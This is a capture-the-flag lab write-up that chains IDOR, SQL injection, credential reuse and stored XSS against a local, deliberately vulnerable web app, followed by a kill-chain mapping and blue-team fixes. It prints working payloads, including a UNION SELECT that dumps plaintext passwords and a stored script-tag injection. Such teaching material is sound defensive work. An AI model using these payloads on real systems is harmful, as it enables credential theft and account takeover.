# Day 6 — Core Web Vulnerabilities (Vulnerability Chaining)

**Lab:** The Chain — IDOR → SQL Injection → Privilege Escalation → Stored XSS
**Date:** 2026-10-12
**Environment:** Kali + Firefox, target `http://localhost:5000` (`day06-web-vulns`)
**Flag:** `CODED{1d0r_sql1_xss}`

---

## Objective

Chain three web vulnerabilities to escalate from a regular user account to a hidden admin-only flag. Each vulnerability reveals what's needed for the next — the core lesson being that real attacks are *chains*, not single findings.

## Setup

```bash
cd ~/Desktop/Foundation\ Labs/day06-web-vulns
sudo ./start.sh                  # vuln-app + log-server
# Web App:    http://localhost:5000
# Starting creds: alice / password1
```

---

## The Chain

### Step 1 — Get in

Logged in at `/login` as `alice` / `password1`. Landing on alice's own profile at `/profile/2` showed her record — User ID **2**, role **user**, SSN `234-56-7890`.

### Step 2 — IDOR (Insecure Direct Object Reference)

The profile URL ends in a user-controlled ID: `/profile/2`. The app trusts that number without checking whether the logged-in user is authorized to view it. Changing the ID walks straight into other users' records:

```
/profile/2   → alice   (me)
/profile/1   → CodedAdmin  ← another user's full record
```

`/profile/1` exposed the **admin** account I should never see — username `CodedAdmin`, role `admin`, SSN `123-45-6789`, and a **Private Note**:

```
Staff directory: /admin/users
```

**IDOR findings:** the admin's identity (`CodedAdmin`, ID 1) and a new endpoint, `/admin/users` — the lead for Step 3.

### Step 3 — SQL Injection

`/admin/users` is a **Staff Directory** with a "Search by username" box. Testing for injection with a single quote:

```
'
```

returned a verbose database error:

```
Database error: unrecognized token: ""
```

That confirms two things: the input is concatenated straight into the SQL query (no sanitization), and the backend is **SQLite** (its error wording), with errors echoed to the page.

**Dump all rows** (always-true condition):

```
' OR '1'='1
```

Returned the full user table — 5 users — revealing the query returns **3 columns** (ID, Username, Email).

**Exfiltrate credentials** with a 3-column UNION, slotting `password` into the visible Email column:

```
' UNION SELECT id, username, password FROM users --
```

The results interleaved each user's real row with the injected row, leaking every password:

| ID | Username | Password |
|----|----------|----------|
| 1 | CodedAdmin | **admin123** |
| 2 | alice | password1 |
| 3 | bob | bob2024 |
| 4 | charlie | charlie! |
| 5 | eve | evil_eve |

**SQLi finding:** CodedAdmin's password = **`admin123`** (stored in plaintext — a finding in itself).

### Step 4 — Escalate

Logged out of alice and authenticated at `/login` as **`CodedAdmin` / `admin123`** (recovered in Step 3). This grants legitimate access to the admin-only area at `/admin/panel` — the "Admin Panel" for posting staff announcements, which regular users cannot reach.

### Step 5 — Stored XSS

The admin panel's source carried the tell:

```html
<!-- VULNERABLE: | safe disables Jinja auto-escaping — stored XSS -->
```

The `| safe` filter disables Jinja2's HTML auto-escaping, so whatever is submitted through the **New Announcement** form (`<input name="content">`, posting to `/admin/post`) is rendered as **raw HTML** and saved to the database — i.e. stored XSS that executes for every visitor.

The page also defines the flag in a JavaScript variable:

```html
<script>var admin_token = "CODED{1d0r_sql1_xss}";</script>
```

Injecting a script that reads that variable and displays it — posted as an announcement:

```html
<script>alert(admin_token)</script>
```

On reload, the stored payload executed and popped the flag:

```
CODED{1d0r_sql1_xss}
```

### Flag

```
CODED{1d0r_sql1_xss}
```

(The flag name itself describes the chain: **idor → sql1 → xss**.)

---

## Kill Chain Mapping

*(Lockheed Martin Cyber Kill Chain — web-app chain mapped to the nearest stage)*

| Task | Kill Chain Stage | What I did |
|------|------------------|------------|
| Step 1 — Login | **Delivery / Initial Access** | Authenticated with the issued low-privilege account (`alice`) |
| Step 2 — IDOR | **Reconnaissance** | Tampered the `/profile/<id>` identifier to read other users' records; harvested the admin identity and the `/admin/users` endpoint |
| Step 3 — SQL Injection | **Exploitation (Credential Access)** | Broke out of the search query's string context and used a UNION to exfiltrate all stored passwords, including the admin's |
| Step 4 — Escalate | **Privilege Escalation** | Logged in as `CodedAdmin` with the recovered password, reaching the admin-only panel |
| Step 5 — Stored XSS | **Actions on Objectives** | Injected a persistent script into the announcement form to execute in-page and reveal the hidden admin token (the flag) |

---

## Techniques used

| Technique | Where | Payload / action |
|-----------|-------|------------------|
| IDOR | `/profile/<id>` | Changed `2` → `1` to read the admin's record |
| SQLi — error-based probe | `/admin/users` search | `'` |
| SQLi — boolean dump | `/admin/users` search | `' OR '1'='1` |
| SQLi — UNION exfiltration | `/admin/users` search | `' UNION SELECT id, username, password FROM users --` |
| Credential reuse / escalation | `/login` | `CodedAdmin` / `admin123` |
| Stored XSS | `/admin/panel` announcement | `<script>alert(admin_token)</script>` |

---

## Blue-team reflection

All three vulnerabilities share one root cause the lab calls out explicitly: **trusting user-controlled input.** Each has a concrete defense:

- **IDOR** — the app returned any profile by ID with no ownership/authorization check. Fix: enforce object-level authorization on every request (does *this* user own, or have a role permitting, *this* record?). Don't rely on the ID being hard to guess. Detection: a single user requesting many sequential `/profile/<id>` values is an enumeration signal.
- **SQL Injection** — user input was concatenated into the query. Fix: **parameterized queries / prepared statements** so input is always data, never code; add least-privilege DB accounts and turn **off verbose error messages** in production (the echoed SQLite error handed the attacker the DB engine and confirmed injection). Passwords were stored in plaintext — they must be salted and hashed (bcrypt/argon2). Detection: WAF/IDS signatures for `UNION SELECT`, `' OR '1'='1`, and SQL error spikes.
- **Stored XSS** — `| safe` disabled output encoding. Fix: never disable auto-escaping on user data; apply context-aware output encoding and a Content-Security-Policy that blocks inline script. Detection: announcement/content fields containing `<script>` or event handlers (`onerror=`, `onload=`) should be flagged on write.

**Chaining takeaway:** none of these alone necessarily reaches the flag, but linked, each one's output is the next one's input — IDOR named the target and endpoint, SQLi handed over the admin password, escalation opened the admin panel, and XSS extracted the secret inside it. Defenders have to assume a single low-severity finding (an exposed ID, a verbose error) is step one of a chain, not an isolated bug.

## Cleanup

```bash
./stop.sh
```
